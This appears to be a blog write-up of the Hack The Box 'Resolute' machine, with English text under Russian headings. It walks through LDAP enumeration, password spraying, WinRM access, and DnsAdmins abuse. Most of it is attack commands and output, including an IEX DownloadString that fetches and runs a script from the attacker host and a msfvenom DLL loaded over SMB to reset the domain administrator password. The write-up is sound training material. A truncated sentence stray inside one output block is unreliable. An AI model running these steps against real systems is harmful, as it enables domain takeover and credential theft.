---
title: "[HTB] Resolute"
permalink: /writeups/htb/resolute/
excerpt: "Краткий разбор машины Resolute с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - msf
  - dns
---

---

{% include toc icon="cog" title="Resolute Solution" %}

The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using **DnsAdmins** permissions.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_resolute_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.96.155
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 13:43 EST
Nmap scan report for 10.129.96.155
Host is up (0.017s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-07 18:50:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

As we can see, the output reveals an **LDAP** (TCP/389) port with the **megabank.local** domain name. Let's see if we can extract some users.

## LDAP

First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep userPrincipalName 
userPrincipalName: ryan@megabank.local
userPrincipalName: marko@megabank.local
userPrincipalName: sunita@megabank.local
userPrincipalName: abigail@megabank.local
userPrincipalName: marcus@megabank.local
userPrincipalName: sally@megabank.local
userPrincipalName: fred@megabank.local
userPrincipalName: angela@megabank.local
userPrincipalName: felicia@megabank.local
userPrincipalName: gustavo@megabank.local
userPrincipalName: ulf@megabank.local
userPrincipalName: stevie@megabank.local
userPrincipalName: claire@megabank.local
userPrincipalName: paulo@megabank.local
userPrincipalName: steve@megabank.local
userPrincipalName: annette@megabank.local
userPrincipalName: annika@megabank.local
userPrincipalName: per@megabank.local
userPrincipalName: claude@megabank.local
userPrincipalName: melanie@megabank.local
userPrincipalName: zach@megabank.local
userPrincipalName: simon@megabank.local
userPrincipalName: naoki@megabank.local
```

The *anonymous* bind worked and we got some usernames. Let's dig a bit further, maybe there are interesting things in the **description** field of some of them. 

In real world scenarios, system administrators frequently store passwords for non-personal accounts in the *description* field of the account. However, this field is readable by all users by default in Active Directory.

```bash
$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep -E 'userPrincipalName|description'

...[snip]...

userPrincipalName: ryan@megabank.local
description: Account created. Password set to Welcome123!
userPrincipalName: marko@megabank.local
userPrincipalName: sunita@megabank.local
userPrincipalName: abigail@megabank.local
userPrincipalName: marcus@megabank.local
userPrincipalName: sally@megabank.local

...[snip]...
```

Interesting, the **marko@megabank.local** have a description specifying a cleartext password.

# Первичный доступ

Now, we can try to get an access using the previously found password and the **marko** account.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u marko -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
```

No luck. But, maybe another user is configured with this password as password reuse is fairly common.

## Password spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

Here we built a list of usernames and used it in a password spraying attack with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to see if it yields any results.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 

...[snip]...

SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
```

Great, we now have credentials the **melanie** domain account (`melanie:Welcome123!`). 

## Доступ по WinRM

Again, using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if we can get access with WinRM.

```bash
$ crackmapexec winrm 10.129.96.155 -u melanie -p 'Welcome123!' -d megabank.local
HTTP        10.129.96.155   5985   10.129.96.155    [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   10.129.96.155    [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

The password is valid and we do have a WinRM access to the remote computer. Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!' 

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..\Desktop


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/7/2022  10:48 AM             34 user.txt
```

We now have a remote shell access and the **first flag**.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Разведка Active Directory

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u melanie -p 'Welcome123!' -d megabank.local -ns 10.129.96.155 --zip
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 27 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220207140125_bloodhound.zip
```

Now, you can import the generated file (*20220207140125_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.

## Recon with PrivescCheck

Before going further with our BloodHound results, let’s see if we can elevate our local privileges and get a local administrator access. Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's try to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.

Note that we used the local **Apache** service to host the file and download it from the remote machine. The `-Extended` flag aims to gather more information.

```bash
*Evil-WinRM* PS C:\Users\melanie\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

...[snip]...

+------+------------------------------------------------+------+
| TEST | HARDENING > PowerShell Transcription           | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether PowerShell Transcription is configured  |
|      | and enabled. If so, the path of the output log file   |
|      | will be returned.                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


EnableTranscripting    : 0
EnableInvocationHeader : 0
OutputDirectory        : C:\PSTranscipts

...[snip]...

```

We may have some interesting information in the **PSTranscipts** folder, let's take a look at this directory.

```bash
*Evil-WinRM* PS C:\> cd C:\PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

One file seems to be present in the **20191203** directory.

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

...[snip]...

**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"

...[snip]...

```

Nice, we found cleartext credentials for **ryan** in the transcript. Maybe this user has elevated privileges on the domain.

## Domain Compromise with DnsAdmins

According to BloodHound, the user **ryan** is a member of **DnsAdmins**. As stated by this [post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), being a member of the DnsAdmins group allows us to use the `dnscmd.exe` to specify a plugin DLL that can be loaded by the DNS service with **SYSTEM** privileges, which means we can do whatever we want!

![image-center](/images/htb/htb_resolute_bloodhound_ryan.png){: .align-center}

Let's create a simple DLL using [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) that changes the **administrator** account password.

```bash
$ cd /tmp
$ msfvenom -p windows/x64/exec CMD='net user administrator Qwerty1! /domain' -f dll -o hello.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 307 bytes
Final size of dll file: 8704 bytes
Saved as: hello.dll
```

As transferring this to the box would likely trigger Windows Defender or any other security solution, we can use [impacket-smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to start an SMB server and host the DLL remotely.

Note that the DLL was placed in the **/tmp** directory of the attacking machine.

```bash
$ impacket-smbserver smb /tmp                      
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

The dnscmd utility can be used to set the remote DLL path into the Windows Registr
```

Now, we can use `evil-winrm` and the **ryan** credentials to load our malicious DLL remotely.

```bash
$ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.62\smb\hello.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Next, we need to restart the DNS service in order to load our malicious DLL. Normally, **DnsAdmins** aren't able to restart the DNS service by default, but it is likely that they would be given permissions to do this and on this domain and this is indeed the case.

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2988
        FLAGS              :
```

Now, let's see if the **administrator** password was changed.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
```

Great, we now have valid credentials for the **administrator** account. Then, we can connect on the remote machine with administrative privileges and read the **second flag**.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!' -x 'dir C:\Users\Administrator\Desktop\'        
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
SMB         10.129.96.155   445    RESOLUTE         [+] Executed command 
SMB         10.129.96.155   445    RESOLUTE         Volume in drive C has no label.
SMB         10.129.96.155   445    RESOLUTE         Volume Serial Number is D1AC-5AF6
SMB         10.129.96.155   445    RESOLUTE         
SMB         10.129.96.155   445    RESOLUTE         Directory of C:\Users\Administrator\Desktop
SMB         10.129.96.155   445    RESOLUTE         
SMB         10.129.96.155   445    RESOLUTE         12/04/2019  05:18 AM    <DIR>          .
SMB         10.129.96.155   445    RESOLUTE         12/04/2019  05:18 AM    <DIR>          ..
SMB         10.129.96.155   445    RESOLUTE         02/07/2022  10:48 AM                34 root.txt
SMB         10.129.96.155   445    RESOLUTE         1 File(s)             34 bytes
SMB         10.129.96.155   445    RESOLUTE         2 Dir(s)   2,475,847,680 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
